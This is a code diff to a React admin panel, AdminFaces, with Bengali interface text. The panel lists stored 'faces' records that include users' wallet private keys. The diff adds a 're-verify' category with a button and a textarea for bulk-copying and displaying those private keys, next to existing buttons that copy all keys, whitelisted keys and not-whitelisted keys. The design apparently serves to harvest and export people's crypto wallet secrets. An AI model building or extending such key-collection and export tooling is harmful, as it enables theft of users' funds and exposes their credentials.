@@ -32,6 +32,9 @@ function AdminFaces() {
   const notWhitelistedKeys = (data ?? [])
     .filter((t: any) => t.wallet_private_key && !(t.whitelist_ok ?? false))
     .map((t: any) => t.wallet_private_key as string);
+  const reverifyKeys = (data ?? [])
+    .filter((t: any) => t.wallet_private_key && (t.reverify_count ?? 0) > 0)
+    .map((t: any) => t.wallet_private_key as string);
   const copyAllKeys = async () => {
     if (allKeys.length === 0) return toast.error("কোনো key নেই");
     await navigator.clipboard.writeText(allKeys.join("\n"));
@@ -47,12 +50,17 @@ function AdminFaces() {
     await navigator.clipboard.writeText(notWhitelistedKeys.join("\n"));
     toast.success(`${notWhitelistedKeys.length} টি not-whitelisted key কপি হয়েছে`);
   };
+  const copyAllReverify = async () => {
+    if (reverifyKeys.length === 0) return toast.error("কোনো re-verify key নেই");
+    await navigator.clipboard.writeText(reverifyKeys.join("\n"));
+    toast.success(`${reverifyKeys.length} টি re-verify key কপি হয়েছে`);
+  };
 
   return (
     <div>
       <div className="glass rounded-xl p-3 mb-3 space-y-2">
         <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-bold">
-          Total saved faces: {data?.length ?? 0} · Total keys: {allKeys.length} · Whitelisted: {whitelistedKeys.length} · Not-whitelisted: {notWhitelistedKeys.length}
+          Total saved faces: {data?.length ?? 0} · Total keys: {allKeys.length} · Whitelisted: {whitelistedKeys.length} · Not-whitelisted: {notWhitelistedKeys.length} · Re-verify: {reverifyKeys.length}
         </p>
         <button onClick={copyAllKeys}
           className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-cyan/15 border border-cyan/30 text-cyan font-black text-xs btn-press">
@@ -68,6 +76,16 @@ function AdminFaces() {
             <Copy className="w-3 h-3" /> Not-whitelisted ({notWhitelistedKeys.length})
           </button>
         </div>
+        <button onClick={copyAllReverify}
+          className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-purple-500/15 border border-purple-500/30 text-purple-300 font-black text-[11px] btn-press">
+          <Copy className="w-3 h-3" /> Re-verify keys কপি করুন ({reverifyKeys.length})
+        </button>
+        <textarea
+          readOnly
+          value={reverifyKeys.join("\n")}
+          placeholder="Re-verify করা key গুলো এখানে দেখাবে"
+          className="w-full h-20 px-2 py-1.5 rounded bg-surface-2 border border-purple-500/30 text-[10px] mono-num resize-none outline-none"
+        />
         <textarea
           readOnly
           value={allKeys.join("\n")}
